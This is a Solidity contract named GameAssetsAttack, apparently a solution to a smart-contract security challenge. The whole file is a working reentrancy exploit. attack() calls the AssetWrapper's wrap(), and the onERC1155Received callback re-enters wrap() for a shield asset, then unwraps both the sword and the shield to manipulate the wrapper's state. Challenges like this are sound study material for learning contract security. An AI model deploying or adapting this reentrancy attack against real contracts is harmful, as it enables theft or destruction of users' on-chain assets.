//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {GameAsset} from "src/game-assets/GameAsset.sol";
import {AssetWrapper} from "src/game-assets/AssetWrapper.sol";

contract GameAssetsAttack {
    AssetWrapper public assetWrapper;
    GameAsset public swordAsset;
    GameAsset public shieldAsset;
    bool public unwrap;

    constructor(address _assetWrapper, address _swordAsset, address _shieldAsset) {
        assetWrapper = AssetWrapper(_assetWrapper);
        swordAsset = GameAsset(_swordAsset);
        shieldAsset = GameAsset(_shieldAsset);
    }

    function attack() public {
        // call `wrap()` which calls `onERC1155Received()` from this contract
        assetWrapper.wrap({nftId: 0, assetOwner: address(this), assetAddress: address(swordAsset)});
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        external
        returns (bytes4)
    {
        // to allow for wrapping the shieldAsset once
        if (!unwrap) {
            unwrap = true;

            // calls `onERC1155Received()` again which executes the else block
            assetWrapper.wrap({nftId: 0, assetOwner: address(this), assetAddress: address(shieldAsset)});
        } else {
            assetWrapper.unwrap({assetOwner: address(this), assetAddress: address(swordAsset)});
            assetWrapper.unwrap({assetOwner: address(this), assetAddress: address(shieldAsset)});
        }

        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }
}
